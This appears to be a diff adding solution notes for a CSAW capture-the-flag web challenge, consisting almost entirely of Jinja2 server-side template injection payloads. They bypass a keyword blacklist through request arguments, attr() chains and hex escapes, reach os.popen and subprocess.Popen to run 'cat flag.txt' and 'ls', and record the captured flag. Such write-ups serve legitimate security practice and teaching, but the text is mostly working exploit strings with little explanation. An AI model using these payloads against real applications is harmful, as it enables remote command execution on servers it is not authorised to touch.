@@ -1,0 +1,31 @@
+
+{{ config }}
+Sorry, the following keywords/characters are not allowed :- _ ,config ,os, RUNCMD, base
+
+
+{{ config }}
+http://web.chal.csaw.io:5000/submit?value={{request|attr(request.args.getlist(request.args.l)|join)}}&l=a&a=config
+
+
+request.__class__
+http://web.chal.csaw.io:5000/submit?value={{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}&class=class&usc=_
+
+request.__class__.__mro__
+http://web.chal.csaw.io:5000/submit?value={{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)|attr([request.args.usc*2,request.args.mro,request.args.usc*2]|join)}}&class=class&usc=_&mro=mro
+
+
+request.__class__.__mro__
+http://web.chal.csaw.io:5000/submit?value={{request|attr(request.args.getlist(request.args.l)|join)|attr(request.args.getlist(request.args.l2)|join)}}&l=a&a=_&a=_&a=class&a=_&a=_&l2=b&b=__mro__
+
+request.__init__
+
+http://web.chal.csaw.io:5000/submit?value={{request|attr(request.args.getlist(request.args.l)|join)|attr(request.args.getlist(request.args.l2)|join)|attr(request.args.getlist(request.args.l3)|join)(request.args.getlist(request.args.l4)|join)|attr(request.args.getlist(request.args.l3)|join)(request.args.getlist(request.args.l5)|join)('o''s')|attr('p''o''p''e''n')('cat flag.txt')|attr('r''e''a''d')()}}&l=a&a=__init__&l2=b&b=__globals__&l3=c&c=__getitem__&l4=d&d=__builtins__&l5=e&e=__import__
+	flag{m0mmy_s33_1m_4_r34l_n1nj4}
+
+
+=========== Other Solution =============
+
+{{request['application']['\x5f\x5fglobals\x5f\x5f']['\x5f\x5fbuiltins\x5f\x5f']['\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f']('\x6f\x73')['\x70\x6f\x70\x65\x6e']('ls')['read']()}}
+
+
+{{()|attr(request.args.c)|attr(request.args.b)|attr(request.args.s)()|attr(request.args.g)(258)('ls',shell=True,stdout=-1)|attr('communicate')()|attr(request.args.g)(0)|attr('decode')('utf-8')}}&c=__class__&b=__base__&s=__subclasses__&g=__getitem__
